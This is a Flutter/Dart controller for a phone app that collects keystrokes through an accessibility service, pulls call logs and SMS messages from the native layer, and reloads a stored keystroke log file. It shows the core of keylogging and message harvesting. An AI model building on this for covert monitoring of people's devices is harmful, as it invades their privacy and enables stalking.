import 'dart:io';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_phone_events/core/services/method_channel_service.dart';

// controller for the home screen — manages logs, call/SMS data, and accessibility status
class HomeController extends GetxController with WidgetsBindingObserver {
  final MethodChannelService _channelService = MethodChannelService();

  // reactive log list for keystrokes (newest first)
  var logs = <String>[].obs;

  // reactive lists for call logs and SMS messages from native layer
  var callLogs = <Map<String, dynamic>>[].obs;
  var smsLogs = <Map<String, dynamic>>[].obs;

  // whether the accessibility service is currently enabled
  var isAccessibilityEnabled = false.obs;

  // loading state for call/SMS data
  var isLoadingComm = false.obs;

  @override
  void onInit() {
    super.onInit();
    WidgetsBinding.instance.addObserver(this);

    // wire up the method channel and set the keystroke callback
    _channelService.onKeyStrokeReceived = _onKeyStroke;
    _channelService.init();

    _loadLogsFromFile();
    checkAccessibilityStatus();
    // fetch call/SMS data on startup
    fetchCommData();
  }

  @override
  void onClose() {
    WidgetsBinding.instance.removeObserver(this);
    super.onClose();
  }

  // reload logs and data when app returns to foreground
  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _loadLogsFromFile();
      checkAccessibilityStatus();
      fetchCommData();
    }
  }

  // handle incoming keystroke from native layer
  void _onKeyStroke(String text) {
    final entry = '${DateTime.now()}: $text';
    debugPrint('Received from native: $entry');
    logs.insert(0, entry);
  }

  // query native layer for accessibility service status
  Future<void> checkAccessibilityStatus() async {
    isAccessibilityEnabled.value =
        await _channelService.isAccessibilityEnabled();
  }

  // open device accessibility settings via native layer
  Future<void> openAccessibilitySettings() async {
    await _channelService.openAccessibilitySettings();
  }

  // fetch call logs and SMS messages from native layer via method channel
  Future<void> fetchCommData() async {
    isLoadingComm.value = true;
    try {
      final calls = await _channelService.getCallLogs();
      callLogs.assignAll(calls);

      final sms = await _channelService.getSmsLogs();
      smsLogs.assignAll(sms);
    } catch (e) {
      debugPrint('Fetch comm data error: $e');
    } finally {
      isLoadingComm.value = false;
    }
  }

  // read log file from disk to populate the list with events captured while ui was closed
  Future<void> _loadLogsFromFile() async {
    try {
      final dir = await getApplicationDocumentsDirectory();
      final filesDir = dir.path.replaceFirst('/app_flutter', '');
      final file = File('$filesDir/../files/security_logs.txt');

      if (await file.exists()) {
        final lines = await file.readAsLines();
        logs.assignAll(lines.reversed.toList());
      }
    } catch (e) {
      debugPrint('File load error: $e');
    }
  }
}
